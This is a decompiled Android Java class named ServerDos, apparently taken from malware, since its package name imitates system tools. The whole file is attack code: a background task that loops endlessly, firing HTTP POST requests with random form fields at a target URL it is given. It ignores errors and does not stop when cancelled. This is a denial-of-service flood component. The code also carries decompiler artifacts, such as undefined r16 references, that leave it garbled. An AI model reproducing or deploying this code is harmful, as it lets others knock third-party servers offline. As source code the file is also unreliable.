package com.android.tools.system;

import android.content.Context;
import android.os.AsyncTask;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Random;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

public class ServerDos extends AsyncTask<String, Void, Void> {
    public Context context;

    /* access modifiers changed from: protected|bridge */
    public /* bridge */ Object doInBackground(Object[] objArr) {
        return doInBackground((String[]) objArr);
    }

    /* access modifiers changed from: protected|bridge */
    public /* bridge */ void onPostExecute(Object obj) {
        onPostExecute((Void) obj);
    }

    public ServerDos(Context context) {
        this.context = context;
    }

    /* access modifiers changed from: protected|varargs */
    @Override
    public Void doInBackground(String... strArr) {
        String[] strArr2 = strArr;
        String str = "";
        while (true) {
            boolean isCancelled = isCancelled();
            Object obj = null;
            Object obj2 = null;
            DefaultHttpClient defaultHttpClient = null;
            try {
                ArrayList arrayList = r16;
                ArrayList arrayList2 = new ArrayList();
                ArrayList arrayList3 = arrayList;
                Random random = r16;
                Random random2 = new Random(System.currentTimeMillis());
                int nextInt = 1 + random.nextInt(12);
                for (int i = 1; i < nextInt; i++) {
                    arrayList = arrayList3;
                    BasicNameValuePair basicNameValuePair = r16;
                    BasicNameValuePair basicNameValuePair2 = new BasicNameValuePair(String.valueOf(i), String.valueOf(i));
                    isCancelled = arrayList.add(basicNameValuePair);
                }
                if (defaultHttpClient == null) {
                    DefaultHttpClient defaultHttpClient2 = r16;
                    DefaultHttpClient defaultHttpClient3 = new DefaultHttpClient();
                    defaultHttpClient = defaultHttpClient2;
                }
                HttpPost httpPost = r16;
                HttpPost httpPost2 = new HttpPost(strArr2[0]);
                HttpPost httpPost3 = httpPost;
                httpPost = httpPost3;
                UrlEncodedFormEntity urlEncodedFormEntity = r16;
                UrlEncodedFormEntity urlEncodedFormEntity2 = new UrlEncodedFormEntity(arrayList3);
                httpPost.setEntity(urlEncodedFormEntity);
                str = EntityUtils.toString(defaultHttpClient.execute(httpPost3).getEntity(), "UTF-8");
            } catch (ClientProtocolException e) {
                e.printStackTrace();
            } catch (IOException e2) {
                e2.printStackTrace();
            } catch (Exception e3) {
                e3.printStackTrace();
            }
        }
    }

    /* access modifiers changed from: protected */
    @Override
    public void onPostExecute(Void voidR) {
        super.onPostExecute(voidR);
    }

    /* access modifiers changed from: protected */
    @Override
    public void onCancelled() {
        super.onCancelled();
    }
}
